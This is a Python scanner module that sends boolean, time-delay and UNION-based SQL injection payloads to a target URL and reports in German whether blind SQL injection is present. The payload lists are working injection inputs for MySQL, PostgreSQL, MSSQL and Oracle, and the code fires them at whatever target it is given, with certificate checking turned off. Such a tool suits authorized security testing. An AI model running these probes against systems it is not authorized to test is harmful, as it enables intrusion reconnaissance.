#!/usr/bin/env python3
"""
Blind SQL Injection Proof-of-Concept Detector
Makes SQL Injection VISIBLE through 3 safe techniques:
1. Boolean-Based: Compares response sizes (AND 1=1 vs AND 1=2)
2. Time-Based: Measures SLEEP() delay in response time
3. Union-Based: Tests UNION SELECT column count
SAFE: Only DETECTS, does NOT exploit or extract data.
"""
import requests
import time

BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2", "Basic string AND"),
    ("' AND 1=1--", "' AND 1=2--", "MySQL/PostgreSQL/MSSQL AND"),
    ('" AND 1=1--', '" AND 1=2--', "Double-quote AND"),
    ("' AND 1=1#", "' AND 1=2#", "MySQL hash comment"),
    ("' AND 1=1/*", "' AND 1=2/*", "C-style comment"),
    ("'||'1'='1", "'||'1'='2", "Oracle string concat"),
    ("') AND 1=1--", "') AND 1=2--", "Closed parenthesis"),
    ("%' AND 1=1 AND '%'='", "%' AND 1=2 AND '%'='", "LIKE clause"),
]

TIME_PAYLOADS = [
    ("' AND SLEEP(3)--", "MySQL SLEEP", "mysql"),
    ("' AND pg_sleep(3)--", "PostgreSQL pg_sleep", "postgresql"),
    ("'; WAITFOR DELAY '0:0:3'--", "MSSQL WAITFOR", "mssql"),
    ("'||dbms_pipe.receive_message(('a'),3)||'", "Oracle DBMS_PIPE", "oracle"),
]

UNION_PAYLOADS = [
    "' UNION SELECT null--", "' UNION SELECT null,null--",
    "' UNION SELECT null,null,null--", "' UNION SELECT null,null,null,null--",
    "' UNION SELECT null,null,null,null,null--",
]


def _send(target, payload, param="id"):
    try:
        url = f'{target}?{param}={requests.utils.quote(payload)}'
        start = time.time()
        resp = requests.get(url, timeout=20, verify=False, allow_redirects=False,
                           headers={'User-Agent': 'Mozilla/5.0 (SecurityScan/3.3)'})
        return {'status': resp.status_code, 'size': len(resp.content), 'time': time.time() - start,
                'text': resp.text[:3000]}
    except requests.exceptions.Timeout:
        return {'status': -1, 'size': -1, 'time': 20, 'timeout': True}
    except Exception as e:
        return {'status': 0, 'size': 0, 'time': 0, 'error': str(e)}


def scan(target):
    findings = []
    scan_id = 0
    if not target.startswith('http'):
        target = f'https://{target}'
    print(f"[PHASE SQLi-PoC] Testing {target}")

    baseline = _send(target, "1")
    if baseline.get('error'):
        findings.append({'id': f'sqli-poc-{scan_id}', 'severity': 'info', 'type': 'sqli_poc_error',
                         'title': 'Blind SQLi: Baseline failed', 'url': target,
                         'evidence': f'Error: {baseline["error"]}', 'remediation': 'Check target URL.'})
        return findings

    # Boolean-Based
    boolean_results = []
    for true_p, false_p, desc in BOOLEAN_PAYLOADS:
        t_resp = _send(target, true_p)
        f_resp = _send(target, false_p)
        size_diff = abs(t_resp['size'] - f_resp['size'])
        if size_diff > max(baseline['size'] * 0.05, 500):
            db_type = "mysql" if "MySQL" in desc else "postgresql" if "PostgreSQL" in desc else "mssql" if "MSSQL" in desc else "oracle" if "Oracle" in desc else "unknown"
            boolean_results.append({'type': desc, 'true_size': t_resp['size'], 'false_size': f_resp['size'],
                                    'diff': size_diff, 'true_payload': true_p, 'false_payload': false_p, 'db_guess': db_type})

    if boolean_results:
        best = boolean_results[0]
        findings.append({
            'id': f'sqli-poc-{scan_id}', 'severity': 'critical', 'type': 'blind_sqli_boolean',
            'title': f'[BESTATIGT] Boolean-Based Blind SQL Injection ({best["db_guess"].upper()})',
            'url': f'{target}?id=',
            'evidence': (f'DER BEWEIS - Boolean-Based Blind SQL Injection:\n\n'
                        f'1. TRUE ({best["type"]}):\n   Payload: id={best["true_payload"]}\n   Response: {best["true_size"]} bytes\n\n'
                        f'2. FALSE:\n   Payload: id={best["false_payload"]}\n   Response: {best["false_size"]} bytes\n\n'
                        f'ERGEBNIS: {best["diff"]} Bytes Unterschied!\n'
                        f'Die Datenbank verarbeitet den SQL-Code!'),
            'remediation': 'Sofort Prepared Statements implementieren!'
        })
        scan_id += 1

    # Time-Based
    time_results = []
    for payload, desc, db_type in TIME_PAYLOADS:
        n_start = time.time()
        try: requests.get(f'{target}?id=1', timeout=10, verify=False)
        except: pass
        n_time = time.time() - n_start

        p_start = time.time()
        try: requests.get(f'{target}?id={requests.utils.quote(payload)}', timeout=15, verify=False)
        except: pass
        p_time = time.time() - p_start

        delay = p_time - n_time
        if delay >= 2.0:
            time_results.append({'delay': round(delay, 2), 'payload': payload, 'desc': desc, 'db_type': db_type})

    if time_results:
        best = max(time_results, key=lambda x: x['delay'])
        findings.append({
            'id': f'sqli-poc-{scan_id}', 'severity': 'critical', 'type': 'blind_sqli_time',
            'title': f'[BESTATIGT] Time-Based Blind SQL Injection ({best["db_type"].upper()})',
            'url': f'{target}?id=',
            'evidence': (f'DER BEWEIS - Time-Based Blind SQL Injection:\n\n'
                        f'Normal: {best["normal_time"] if "normal_time" in best else "N/A"}s\n'
                        f'Mit Payload: {best["payload_time"] if "payload_time" in best else best["delay"]}s\n'
                        f'DELAY: {best["delay"]} SEKUNDEN!\n'
                        f'Payload: id={best["payload"]}\n\n'
                        f'Die Datenbank hat SLEEP() ausgefuehrt!'),
            'remediation': 'SOFORT Prepared Statements einbauen!'
        })
        scan_id += 1

    # Union-Based
    union_results = []
    for payload in UNION_PAYLOADS:
        resp = _send(target, payload)
        if resp['status'] == baseline['status'] and abs(resp['size'] - baseline['size']) < max(baseline['size'] * 0.1, 500):
            if resp['size'] > 100:
                union_results.append({'payload': payload, 'columns': payload.count('null')})

    if union_results:
        best = union_results[0]
        findings.append({
            'id': f'sqli-poc-{scan_id}', 'severity': 'critical', 'type': 'union_sqli',
            'title': f'[BESTATIGT] UNION-Based SQL Injection ({best["columns"]} Spalten)',
            'url': f'{target}?id=',
            'evidence': (f'UNION-BASED SQL INJECTION BESTATIGT!\n\n'
                        f'Payload: id={best["payload"]}\n'
                        f'Spalten: {best["columns"]}\n'
                        f'Die UNION SELECT wurde AKZEPTIERT!'),
            'remediation': 'Prepared Statements + Input-Validierung!'
        })
        scan_id += 1

    # Summary
    if not findings:
        findings.append({
            'id': f'sqli-poc-{scan_id}', 'severity': 'info', 'type': 'sqli_poc_clean',
            'title': 'Blind SQLi PoC: Keine SQL Injection nachweisbar',
            'url': target,
            'evidence': f'Boolean: {len(boolean_results)}/8, Time: {len(time_results)}/4, Union: {len(union_results)}/5',
            'remediation': 'Trotzdem Prepared Statements verwenden.'
        })
    else:
        findings.insert(0, {
            'id': f'sqli-poc-{scan_id}', 'severity': 'critical', 'type': 'sqli_poc_summary',
            'title': f'[POC] SQL Injection BESTATIGT via {len(findings)} Methoden!',
            'url': target,
            'evidence': f'Boolean: {"JA" if boolean_results else "NEIN"}, Time: {"JA" if time_results else "NEIN"}, Union: {"JA" if union_results else "NEIN"}',
            'remediation': 'SOFORT patchen! Prepared Statements!'
        })

    return findings
